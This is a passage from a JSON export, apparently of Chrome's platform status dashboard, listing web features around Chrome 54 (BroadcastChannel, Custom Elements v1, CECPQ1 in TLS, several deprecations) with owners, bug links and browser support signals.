          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "ios": 55,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "http://crbug.com/647261",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The close() method is no longer defined for an OfflineAudioContext. It only threw an error anyway, so it wasn't useful.  It's now only defined for an AudioContext.",
    "id": 5683205155848192,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#widl-AudioContext-close-Promise-void",
        "https://github.com/WebAudio/web-audio-api/issues/948"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:51.140920",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Align behavior of window.external.IsSearchProviderInstalled and window.external.AddSearchProvider with the spec",
    "comments": "https://msdn.microsoft.com/en-us/library/aa744112(v=vs.85).aspx\r\nhttps://msdn.microsoft.com/en-us/library/aa342526(v=vs.85).aspx",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/obsolete.html#external",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/Window/sidebar/Adding_search_engines_from_Web_pages",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "dcheng@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "webview": 54,
        "bug": "https://crbug.com/631325",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/en-us/library/aa744112(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "window.external.IsSearchProviderInstalled and window.external.AddSearchProvider will both be defined as methods that are no-ops.\r\n\r\nThis was never implemented in Safari. In IE10, these methods are (mostly) no-ops: IsSearchProviderInstalled always returns 2, and AddSearchProvider always returns S_OK.\r\n\r\nFirefox still implements this, but notes that it may be removed at any time.",
    "id": 5672001305837568,
    "resources": {
      "docs": [
        "https://msdn.microsoft.com/en-us/library/aa744112(v=vs.85).aspx",
        "https://msdn.microsoft.com/en-us/library/aa342526(v=vs.85).aspx",
        "https://developer.mozilla.org/en-US/docs/Web/API/Window/sidebar/Adding_search_engines_from_Web_pages"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-12-14 17:15:53.493630",
      "by": "jmedley@google.com"
    },
    "name": "Beacon with non-CORS-safelisted Content-Type",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/beacon/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 54
        },
        "owners": [
          "tyoshino@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "ios": 54,
        "blink_components": [
          "Blink>Network"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "http://crbug.com/720283",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "sendBeacon() has been available as described in https://www.chromestatus.com/feature/5517433905348608.\r\n\r\nA part of sendBeacon()'s functionalities has been temporarily disabled later due to a security issue.\r\n\r\nThe change is that, from M60, sendBeacon() will throw when called with a Blob whose type is not a CORS-safelisted value for the Content-Type request header as the data argument.\r\n\r\nThis entry is used for tracking progress on resolving the issue and re-enabling the functionality.\r\n",
    "id": 5654267444592640,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:46.530830",
      "by": "ericbidelman@google.com"
    },
    "name": "Blocking sync XHR during microtask execution",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/a/chromium.org/d/msg/blink-dev/uMPT8II-G_c/CHFdj8unAgAJ",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 54
        },
        "owners": [
          "jochen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://crbug.com/605517",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Certain blocking APIs spin up nested message loops. Invoking those APIs during microtask execution has undesirable effects, e.g., it is possible that events are dispatched during microtasks.\r\n\r\nThose APIs currently are alert, prompt, confirm, print, and send() on synchronous XHRs.",
    "id": 5647113010544640,
    "resources": {
      "docs": [
        "TODO: jochen to work with devrel on an article"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-12-13 22:32:15.920100",
      "by": "ericbidelman@google.com"
    },
    "name": "BroadcastChannel",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.whatwg.org/specs/web-apps/current-work/multipage/web-messaging.html#broadcasting-to-other-browsing-contexts",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/38#InterfacesAPIsDOM",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "mek@chromium.org",
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Messaging"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "http://crbug.com/161070",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "BroadcastChannel allows scripts from the same origin but other browsing contexts to send each other messages. Channels are scoped to an origin and have a name, messages posted to a channel will be delivered to all listeners of that channel in all documents.",
    "id": 4585496197988352,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/09/broadcastchannel",
        "https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API",
        "https://hacks.mozilla.org/2015/02/broadcastchannel-api-in-firefox-38/"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:02.959850",
      "by": "ericbidelman@google.com"
    },
    "name": "CECPQ1 in TLS",
    "tags": [
      "TLS",
      "crypto"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "mab@google.com",
          "agl@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=626363",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "CECPQ1 is a post-quantum cipher suite: one that is designed to provide confidentiality even against an attacker who possesses a large quantum computer. It is a key-agreement algorithm plugged into TLS that combines X25519 and NewHope, a ring-learning-with-errors primitive. Even if NewHope turns out to be breakable, the X25519 key-agreement will ensure that it provides at least the security of our existing connections.\r\n\r\nThis is only an experiment and will only be used on a small fraction of HTT",
    "id": 5749214348836864,
    "resources": {
      "docs": [
        "https://security.googleblog.com/2016/07/experimenting-with-post-quantum.html",
        "https://www.imperialviolet.org/2015/12/24/rlwe.html",
        "https://eprint.iacr.org/2015/1092"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:00.171860",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS text-size-adjust",
    "tags": [
      "text autosizing",
      "font boosting"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-size-adjust",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "pdr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "ios": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://crbug.com/623158",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "The text-size-adjust property lets authors control and disable the text autosizing feature which increases font sizes on mobile.",
    "id": 5730156303876096,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/text-size-adjust"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2017-06-14 18:29:08.164960",
      "by": "ericbidelman@google.com"
    },
    "name": "CacheStorage CacheQueryOptions support",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/ServiceWorker/spec/service_worker/index.html#dictdef-cache-cachequeryoptions",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "jinho.bang@samsung.com",
          "nhiroki@chromium.org",
          "jkarlin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://crbug.com/426309",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "CacheQueryOptions (ignoreMethod, ignoreVary, ignoreQuery, and cacheName) have been exposed but worked inconsistently across the various CacheStorage methods. As of M54 they are all supported as specified.\r\n",
    "id": 5915801131417600,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/09/cache-query-options",
        "https://developer.mozilla.org/en-US/docs/Web/API/Cache"
      ]
    }
  },
  {
    "category": "Web Components",
    "updated": {
      "when": "2018-04-13 15:26:11.914390",
      "by": "ericbidelman@google.com"
    },
    "name": "Custom Elements v1",
    "comments": "Safari has indicated that they will not implement customized built-in elements, eg https://github.com/w3c/webcomponents/issues/544#issuecomment-239301184",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/#custom-elements",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/showdependencytree.cgi?id=889230",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "dominicc@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=594918",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/customelements",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/library/prerelease/content/releasenotes/General/WhatsNewInSafari/Articles/Safari_10_1.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Custom Elements let web authors define their own tags. Chrome shipped an implementation based on the working draft of the spec in M33. The current editor's draft of the spec has significant updates based on web developer and implementer feedback.",
    "id": 4696261944934400,
    "resources": {
      "docs": [
        "https://developers.google.com/web/fundamentals/web-components/customelements",
        "https://docs.google.com/a/chromium.org/presentation/d/179IRXRFmDGb3P60OVsoAIsElcaOp__5EuIWLcL8oNos/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:53.346660",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate SVGSVGElement.viewport attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://svgwg.org/svg2-draft/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 54
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "ios": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=395838",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The implementation is trivial but entirely useless and has been since\r\n2012. The attribute is not present at all in Gecko.\r\n\r\nIt has been removed from the spec:\r\nhttps://github.com/w3c/svgwg/commit/99a342c09dc0f8f164667d45d1c8486f0f87af8f\r\n",
    "id": 5686865248124928,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:04.577880",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and Remove SVGZoomEvent",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://svgwg.org/svg2-draft/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 54
        },
        "owners": [
          "davve@opera.com",
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "ios": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=367890",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "SVGZoomEvent has been removed from the SVG 2.0 specification and has a non-functional implementation in Chromium. Since it doesn't work but is still feature detectable, it's in a confusing state right now and should be removed.",
    "id": 5760883808534528,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:29:00.354880",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and remove initTouchEvent",
    "tags": [
      "Touch",
      "TouchEvent",
      "initTouchEvent"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://w3c.github.io/touch-events/#touchevent-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 54
        },
        "owners": [
          "chongz@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "http://crbug.com/522100",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Chrome’s initTouchEvent is not interoperable with Safari's or Firefox’s version of initTouchEvent.\r\nDeprecated since M49.\r\n\r\nDevelopers should use the new TouchEvent constructor.\r\nSee https://www.chromestatus.com/features/4923255479599104",
    "id": 5730982598541312,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/02/chrome-49-deprecations?hl=en#use-of-inittouchevent-is-deprecated"
      ],
      "samples": [
        "https://output.jsbin.com/lohuwa",
        "https://w3c.github.io/touch-events/#firing-a-synthetic-touchevent-from-script"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:47.854460",
      "by": "ericbidelman@google.com"
    },
    "name": "Disable navigations in the unload handler.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "lfg@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://crbug.com/613244",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "When a navigation is initiated in the unload handler, it should be blocked and the previous navigation should continue.\r\n",
    "id": 5655310928707584,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:00.044880",
      "by": "ericbidelman@google.com"
    },
    "name": "Enterprise flag to allow continued use of SHA-1 certificates by private PKIs",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "rsleevi@chromium.org",
          "awhalley@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "http://crbug.com/626432",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Private PKIs are not bound by the CA/Browser Forum's Baseline Requirements, and many not have completed the process to deprecate SHA-1 by Jan 2017, after which we'll start showing interstitials.\r\n\r\nProvide an enterprise flag that would cause SHA-1 certificates that chain to a locally installed trust anchor to display the standard HTTP page icon after Jan 2017.",
    "id": 5728801443020800,
    "resources": {
      "docs": [
        "https://www.chromium.org/Home/chromium-security/education/tls/sha-1",
        "http://go/ltvrp"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-02-21 01:36:55.473850",
      "by": "jmedley@google.com"
    },
    "name": "Expose HTMLAreaElement `download` and `rel` attributes",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/embedded-content.html#the-area-element",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "a.obzhirov@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=605552",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "HTMLAreaElement should define IDL `download` and `rel` attributes for faster access.",
    "id": 5723126851698688,
    "resources": {}
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:22:22.861200",
      "by": "ericbidelman@google.com"
    },
    "name": "Foreign Fetch",
    "tags": [
      "foreign fetch",
      "service worker",
      "third party"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/index.html#install-event-section",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://blog.wanderview.com/blog/2015/07/28/service-worker-meeting-highlights/#foreign-fetch",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Origin trial",
          "val": 8,
          "milestone_str": 54
        },
        "owners": [
          "mek@chromium.org",
          "bsittler@chromium.org",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": true,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=540509",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Foreign Fetch is a proposal to enable third party Service Workers.",
    "id": 5684130679357440,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/09/foreign-fetch",
        "https://github.com/slightlyoff/ServiceWorker/blob/master/foreign_fetch_explainer.md"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/service-worker/foreign-fetch/"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:00.310150",
      "by": "ericbidelman@google.com"
    },
    "name": "MediaStream ended event and onended attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://w3c.github.io/mediacapture-main/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 54
        },
        "owners": [
          "guidou@chromium.org",
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://crbug.com/586924",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The ended event and the corresponding onended attribute have been removed from the MediaStream spec.\r\n\r\nRemoval is anticipated in Chrome 54.",
    "id": 5730404371791872,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2015/07/mediastream-deprecations"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-12-05 18:35:07.299590",
      "by": "ericbidelman@google.com"
    },
    "name": "New DOM node methods: prepend, append, before, after, replaceWith",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dom.spec.whatwg.org/#childnode",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=911477",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "sigbjornf@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=632273",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/domparentnodemethodsprependappendandchildnodemethodsbeforeafterandreplacewith/",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=74648",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The DOM standard provides a set of convenience methods for working with DOM Node trees: ParentNode.prepend(), ParentNode.append(), ChildNode.before(), ChildNode.after(), ChildNode.replaceWith().\r\n\r\nRemoval of the flag is anticipated in Chrome 54.",
    "id": 5723067795898368,
    "resources": {
      "docs": [
        "https://dom.spec.whatwg.org/#parentnode",
        "https://developer.mozilla.org/en-US/docs/Web/API/ChildNode",
        "https://developer.mozilla.org/en-US/docs/Web/API/ParentNode"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:00.982330",
      "by": "ericbidelman@google.com"
    },
    "name": "Node.getRootNode(options)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dom.spec.whatwg.org/#dom-node-getrootnode",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "hayato@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 54,
